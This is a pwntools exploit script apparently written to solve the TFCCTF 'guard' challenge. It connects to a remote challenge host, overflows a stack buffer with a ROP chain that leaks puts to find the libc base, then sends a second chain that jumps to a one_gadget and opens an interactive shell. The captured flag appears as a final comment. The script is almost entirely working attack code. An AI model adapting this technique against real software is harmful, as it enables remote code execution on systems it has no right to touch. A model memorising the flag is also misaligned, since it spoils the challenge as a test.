#!/usr/bin/python3
from pwn import *
gs = '''
b *game+85
continue
'''
elf = context.binary = ELF('./guard')
context.terminal = ['tmux', 'splitw', '-hp', '70']

libc = ELF('./libc.so.6')
#libc = elf.libc

def start():
    if args.GDB:
        return gdb.debug('./guard', gdbscript=gs)
    if args.REMOTE:
        return remote('challs.tfcctf.com', 31484)
    else:
        return process('./guard')
r = start()
#========= exploit here ===================
size = 0x1000
poprbp = 0x000000000040123d#: pop rbp; ret;
poprdi = 0x0000000000401256#: pop rdi; ret;
#ret = 0x40101a#: ret;

r.sendline(b"1")
r.sendlineafter(b"Select the len: ", f"{size}".encode('ascii'))
payload = p64(1)*6
payload += p64(1)

payload += p64(poprdi)
payload += p64(elf.got.puts)
payload += p64(elf.sym.puts)
payload += p64(elf.sym.game)


payload += p64(1) * (262 -11)
payload += p64(0x404000+0x100)# writable
payload += p64(1)
payload += p64(1)
payload += p64(1)
sleep(1)
r.sendline(payload)

leak = u64(r.recvline().strip().ljust(8, b"\x00"))
log.info(f"leak = {hex(leak)}")
libc.address = leak - libc.sym.puts
log.info(f"libc = {hex(libc.address)}")
log.info(f"system = {hex(libc.sym.system)}")
log.info(f"/bin/sh = {hex(next(libc.search(b'/bin/sh')))}")


#2

poprsi = libc.address + 0x000000000002be51 #: pop rsi; ret;
poprdx = libc.address + 0x000000000011f2e7# pop rdx; pop r12; ret;


payload = p64(0)*6
payload += b"\x00\x00\x00\x00\x00\x00\x00\x00"

payload += b"\00"
payload += p64(poprbp)
payload += p64(0x404000+0x300)# writable
payload += p64(poprsi)
payload += p64(0)
payload += p64(poprdx)
payload += p64(0)
payload += p64(0)
payload += p64(libc.address + 0xebc88)

payload += p64(0) * (262 -14)
payload += p64(0x404000+0x100)# writable
payload += p64(0x404000+0x100)#)
payload += p64(0x404000+0x100)#)
payload += p64(0x404000+0x100)#)

r.send(payload)


#========= interactive ====================
r.interactive()
#TFCCTF{94140724348403085254c66a31a6e8e56dcc405b9934ad459b82f4868feca758}



